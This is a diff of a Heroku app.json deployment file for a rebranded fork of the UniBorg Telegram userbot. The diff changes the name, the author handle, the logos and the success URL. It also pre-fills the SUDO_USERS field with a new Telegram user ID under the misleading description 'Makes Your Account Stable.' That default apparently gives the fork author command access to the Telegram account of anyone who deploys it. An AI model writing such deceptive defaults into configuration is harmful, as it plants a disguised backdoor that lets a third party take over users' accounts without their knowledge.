@@ -1,7 +1,7 @@
 {
-  "name": "PornHub",
-  "description": "Only For Legends..... By : @r4v4n4",
-  "logo": "https://telegra.ph/file/18cea3a9a7d9b3261dc1a.jpg",
+  "name": "SurBot",
+  "description": "Only For Legends..... By : @Sur_vivor",
+  "logo": "https://telegra.ph/file/4a29efdf8a2cd3617a3d1.jpg",
   "keywords": [
     "sex",
     "porn",
@@ -12,7 +12,7 @@
   ],
   "repository": "https://gitlab.com/SpEcHiDe/UniBorg",
   "website": "https://telegram.dog/UniBorg",
-  "success_url": "https://telegram.dog/r4v4n4",
+  "success_url": "https://telegram.dog/Sur_vivor",
   "env": {
     "ENV": {
       "description": "Setting this to ANYTHING will enable environment variables.",
@@ -136,7 +136,7 @@
     },
     "SUDO_USERS": {
       "description": "Makes Your Account Stable.",
-      "value": "138312364",
+      "value": "765392045",
       "required": false
     },
     "TZ": {
@@ -222,7 +222,7 @@
     },
     "RAVANA_LEELA": {
       "description": "TO ADD TIME ON YOUR PROFILE PIC, ADD LINK OF IMAGE ENDING WITH .JPG",
-      "value": "https://telegra.ph/file/674ef67d845b4304823d3.jpg",
+      "value": "https://telegra.ph/file/4a29efdf8a2cd3617a3d1.jpg",
       "required": false
     },
     "TELE_GRAM_2FA_CODE": {
